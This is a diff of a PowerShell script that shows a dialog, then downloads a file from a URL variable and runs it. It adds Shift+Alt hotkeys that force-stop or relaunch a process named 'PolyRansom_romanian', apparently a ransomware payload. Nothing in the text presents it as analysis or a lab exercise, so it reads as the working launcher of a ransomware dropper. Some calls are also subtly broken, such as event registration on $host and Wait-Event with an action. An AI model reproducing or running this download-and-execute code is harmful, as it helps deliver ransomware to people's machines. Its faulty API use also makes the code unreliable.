@@ -39,14 +39,44 @@ $form.Add_MouseDown({
 $form.ShowDialog()
 
 Start-Sleep -Seconds 1
-$webClient.DownloadFile($url, $downloadPath)
-if (Test-Path $downloadPath) {
-    Start-Process -FilePath $downloadPath -Wait
-    exit
-} else {
 
+
+
+function DownloadAndExecute {
+    $webClient.DownloadFile($url, $downloadPath)
+    if (Test-Path $downloadPath) {
+        Start-Process -FilePath $downloadPath -Wait
+    }
 }
 
-Start-Sleep -Seconds 60
+function CloseApplication {
+    Stop-Process -Name "PolyRansom_romanian" -Force
+}
 
-Stop-Process -Name "PolyRansom_romanian"
+function OpenApplication {
+    Start-Process -FilePath $downloadPath -Wait
+}
+
+
+DownloadAndExecute
+
+
+Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
+    if ($_.Key -eq "I" -and $_.Shift -and $_.Alt) {
+        CloseApplication
+    }
+} | Out-Null
+
+Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
+    if ($_.Key -eq "O" -and $_.Shift -and $_.Alt) {
+        OpenApplication
+    }
+} | Out-Null
+
+
+try {
+    Wait-Event -Action { } -Timeout ([System.Threading.Timeout]::Infinite)
+}
+finally {
+    Get-EventSubscriber | Unregister-Event
+}
